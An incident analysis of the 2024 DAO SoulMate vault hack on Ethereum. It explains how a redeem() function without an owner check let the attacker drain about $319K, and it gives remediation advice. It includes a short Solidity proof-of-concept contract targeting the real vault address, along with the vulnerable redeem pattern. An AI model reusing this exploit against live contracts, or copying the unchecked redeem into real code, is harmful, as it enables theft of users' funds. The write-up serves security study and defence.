# DAO SoulMate — Unauthorized Redemption via Missing Access Control

| Field | Details |
|------|------|
| **Date** | 2024-01-11 |
| **Protocol** | DAO SoulMate |
| **Chain** | Ethereum |
| **Loss** | ~$319,000 |
| **Attacker** | [0xd215ffaf](https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd) |
| **Attack Contract** | [0xd129d8c1](https://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd) |
| **Vulnerable Contract** | [SoulMate 0x82c063af](https://etherscan.io/address/0x82c063afefb226859abd427ae40167cb77174b68) |
| **Root Cause** | The `redeem(uint256 _shares, address _receiver)` function lacks validation that `_receiver` must be the caller, allowing redemption of arbitrary addresses' assets |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/DAO_SoulMate_exp.sol) |

---

## 1. Vulnerability Overview

The `redeem()` function of the DAO SoulMate vault accepts `_shares` and `_receiver` parameters but lacks validation that `_receiver` must equal `msg.sender`. The attacker specified the victim contract's entire BUI token balance as `_shares` and the attacker's own address as `_receiver`, draining multiple tokens including USDC, DAI, MATIC, AAVE, ENS, ZRX, and UNI.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no receiver validation
function redeem(uint256 _shares, address _receiver) external returns (uint256) {
    // Does not verify that _receiver == msg.sender
    uint256 assets = convertToAssets(_shares);
    _burn(address(victim), _shares);  // Burns victim's shares
    _transferAssets(_receiver, assets); // Attacker receives assets
    return assets;
}

// ✅ Safe code: ERC4626 standard compliant — owner parameter added
function redeem(
    uint256 shares,
    address receiver,
    address owner       // Added: explicitly identifies shares owner
) external returns (uint256 assets) {
    if (msg.sender != owner) {
        uint256 allowed = allowance[owner][msg.sender];
        if (allowed != type(uint256).max)
            allowance[owner][msg.sender] = allowed - shares;
    }
    assets = convertToAssets(shares);
    _burn(owner, shares);
    _transferAssets(receiver, assets);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: DAOSoulMate_decompiled.sol
contract DAOSoulMate {
    function redeem(uint256 p0, address p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Check BUI token balance of victim contract
  │         └─ BUI held by victim = vault shares
  │
  ├─→ [2] Call redeem(
  │         _shares = victim's total BUI balance,
  │         _receiver = attacker address
  │       ) directly
  │
  ├─→ [3] Transfer multiple vault tokens (USDC, DAI, MATIC, etc.) to attacker
  │
  └─→ [4] ~$319K worth of assets drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ISoulMate {
    function redeem(uint256 _shares, address _receiver) external returns (uint256);
}

contract AttackContract {
    ISoulMate constant vault = ISoulMate(0x82c063afefb226859abd427ae40167cb77174b68);
    IERC20    constant BUI   = IERC20(0xb7470Fd67e997b73f55F85A6AF0DeB2c96194885);

    function testExploit() external {
        // [1] Check total BUI balance held by the victim contract
        uint256 totalShares = BUI.balanceOf(address(vault));

        // [2] Call redeem with attacker as _receiver
        // No victim validation → attacker receives all assets
        vault.redeem(totalShares, address(this));

        // Result: receives USDC, DAI, MATIC, AAVE, ENS, ZRX, UNI
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct function call) |
| **DApp Category** | ERC4626 Vault / Liquidity Pool |
| **Impact** | Full vault asset drain |

## 6. Remediation Recommendations

1. **ERC4626 Standard Compliance**: Include the owner parameter in the form `redeem(shares, receiver, owner)` and enforce allowance validation
2. **msg.sender Validation**: At minimum, add `require(receiver == msg.sender || isApproved(owner, msg.sender))` for authorization checks
3. **Audit**: Review that ERC4626 standard function signatures match their implementations
4. **Pre-deployment Fuzzing**: Use fuzzing tools such as Echidna to automatically test arbitrary-address redemption scenarios

## 7. Lessons Learned

- The ERC4626 vault standard requires three parameters — `redeem(shares, receiver, owner)` — and omitting `owner` introduces an arbitrary redemption vulnerability.
- A simple two-parameter `redeem(shares, receiver)` implementation does not validate who the actual owner of the shares is.
- Missing access control vulnerabilities can cause large-scale damage in a single transaction without requiring a flash loan.